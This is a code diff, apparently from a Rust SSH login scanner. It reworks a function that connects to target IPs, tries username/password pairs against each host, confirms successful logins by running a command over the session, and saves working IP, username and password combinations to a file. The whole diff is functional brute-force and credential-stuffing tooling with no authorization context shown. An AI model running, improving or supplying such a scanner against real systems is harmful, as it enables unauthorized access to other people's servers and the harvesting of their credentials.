@@ -103,45 +103,60 @@ fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, ou
     let timeout = 5_000; // milliseconds
     CHECKED.fetch_add(1, Ordering::Relaxed);
 
-    if let Ok(tcp_stream) = net::TcpStream::connect((ip.as_str(), port)) {
-        let mut session = Session::new().unwrap();
-        session.set_tcp_stream(tcp_stream);
-        session.set_timeout(timeout);
+    let tcp_stream_result = net::TcpStream::connect((ip.as_str(), port));
+    
+    match tcp_stream_result {
+        Ok(tcp_stream) => {
+            let mut session = Session::new().unwrap();
+            session.set_tcp_stream(tcp_stream);
+            session.set_timeout(timeout);
 
-        match session.handshake() {
-            Ok(_) => {
-                for (username, password) in &credentials {
-                    match session.userauth_password(username, password) {
-                        Ok(_) => {
-                            session.disconnect(None, "Closing session", None).unwrap();
-                            write_successful_login_to_file(output_file, &ip, username, password);
-                            SUCCESS.fetch_add(1, Ordering::Relaxed);
-                            break;
-                        },
-                        Err(e) => {
-                            if e.to_string().contains("Unable to negotiate") {
-                                // If the error message contains "Unable to negotiate", we treat it as a failed attempt
-                                FAILED.fetch_add(1, Ordering::Relaxed);
-                                break;
-                            } else {
+            match session.handshake() {
+                Ok(_) => {
+                    for (username, password) in &credentials {
+                        COMBOS_CHECKED.fetch_add(1, Ordering::Relaxed);
+
+                        match session.userauth_password(username, password) {
+                            Ok(_) => {
+                                // Execute a harmless command to verify the authentication
+                                let mut channel = session.channel_session().unwrap();
+                                if let Err(_) = channel.exec("echo 'Connection Verified'") {
+                                    FAILED.fetch_add(1, Ordering::Relaxed);
+                                    continue;
+                                }
+                                channel.wait_close().unwrap();
+
+                                if channel.exit_status().unwrap() == 0 {
+                                    session.disconnect(None, "Closing session", None).unwrap();
+                                    write_successful_login_to_file(output_file, &ip, username, password);
+                                    SUCCESS.fetch_add(1, Ordering::Relaxed);
+                                    break;
+                                } else {
+                                    FAILED.fetch_add(1, Ordering::Relaxed);
+                                }
+                            },
+                            Err(_) => {
                                 FAILED.fetch_add(1, Ordering::Relaxed);
                             }
                         }
                     }
+                },
+                Err(e) => {
+                    if e.to_string().contains("timeout") {
+                        TIMEOUTS.fetch_add(1, Ordering::Relaxed);
+                    } else {
+                        FAILED.fetch_add(1, Ordering::Relaxed);
+                    }
                 }
-            },
-
-            Err(e) => {
-                if e.to_string().contains("timeout") {
-                    TIMEOUTS.fetch_add(1, Ordering::Relaxed);
-                } else {
-                    // Handle other errors
-                    FAILED.fetch_add(1, Ordering::Relaxed);
-                }
-            }            
+            }
+        },
+        Err(e) => {
+            if e.to_string().contains("timeout") {
+                TIMEOUTS.fetch_add(1, Ordering::Relaxed);
+            } else {
+                FAILED.fetch_add(1, Ordering::Relaxed);
+            }
         }
-    } else {
-        FAILED.fetch_add(1, Ordering::Relaxed);
     }
 }
 
@@ -172,4 +187,3 @@ fn write_successful_login_to_file(output_file: &str, ip: &str, username: &str, p
     writeln!(file, "IP: {}, Username: {}, Password: {}", ip, username, password).unwrap();
     file.flush().unwrap();
 }
-
